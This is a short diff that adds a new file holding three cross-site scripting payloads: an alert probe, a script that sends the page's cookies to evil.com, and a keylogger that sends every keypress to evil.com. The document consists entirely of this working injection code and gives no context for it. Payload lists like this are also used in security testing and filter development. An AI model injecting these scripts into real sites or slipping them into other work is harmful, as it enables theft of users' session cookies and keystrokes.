@@ -1,0 +1,9 @@
+<script>alert("XSS")</script>
+<script>
+  fetch('https://evil.com/steal?cookie=' + document.cookie);
+</script>
+<script>
+  document.onkeypress = function(e) {
+    fetch('https://evil.com/keylog?key=' + e.key);
+  }
+</script>
